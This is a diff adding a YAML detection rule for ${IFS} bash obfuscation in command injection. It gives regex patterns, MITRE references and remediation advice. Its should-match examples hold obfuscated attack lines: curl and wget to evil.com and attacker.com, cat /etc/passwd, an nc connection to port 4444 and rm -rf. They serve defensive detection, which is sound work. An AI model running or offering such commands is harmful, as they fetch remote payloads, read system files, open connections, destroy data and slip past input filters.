@@ -1,0 +1,57 @@
+version: 1.0.0
+rule_id: cmd-017
+family: CMD
+sub_family: shell_injection
+name: Detects IFS and advanced shell obfuscation techniques
+description: Detects ${IFS} internal field separator and other bash obfuscation techniques used in command injection
+severity: high
+confidence: 0.89
+patterns:
+- pattern: \$\{IFS\}
+  flags: []
+  timeout: 5.0
+- pattern: \$IFS\$\d+
+  flags: []
+  timeout: 5.0
+- pattern: '`[^`]*\$\{IFS\}[^`]*`'
+  flags: []
+  timeout: 5.0
+- pattern: (?i)(wget|curl|nc|cat|bash|sh)\$\{IFS\}
+  flags:
+  - IGNORECASE
+  timeout: 5.0
+- pattern: \$\{IFS%\*\}
+  flags: []
+  timeout: 5.0
+examples:
+  should_match:
+  - test`curl${IFS}evil.com`
+  - wget${IFS}http://attacker.com/payload
+  - cat${IFS}/etc/passwd
+  - bash${IFS}-c${IFS}malicious_command
+  - nc${IFS}192.168.1.1${IFS}4444
+  - curl$IFS$9http://evil.com
+  - ${IFS}rm${IFS}-rf
+  should_not_match:
+  - What is IFS in bash?
+  - How does ${IFS} work?
+  - Explain internal field separator
+  - IFS tutorial for beginners
+  - The IFS variable controls field splitting
+metrics:
+  precision: null
+  recall: null
+  f1_score: null
+  last_evaluated: null
+mitre_attack:
+- T1059
+- T1027
+metadata:
+  created: '2025-11-17'
+  updated: '2025-11-17'
+  author: raxe-ce
+  gap_addressed: "Command Injection - IFS obfuscation (validation gap: 30% miss rate)"
+rule_hash: null
+risk_explanation: ${IFS} (Internal Field Separator) is a bash variable that expands to whitespace, allowing attackers to bypass filters that block space characters in command injection attacks. This obfuscation technique is commonly used to evade basic input validation and execute malicious commands without traditional spacing.
+remediation_advice: Sanitize all user input before shell execution. Block bash variable expansion patterns (${...}) in user input. Use safe API calls instead of shell commands when possible. Implement whitelist-based input validation. Monitor for unusual shell metacharacters and variable expansions.
+docs_url: https://github.com/raxe-ai/raxe-ce/wiki/CMD-017-IFS-Obfuscation
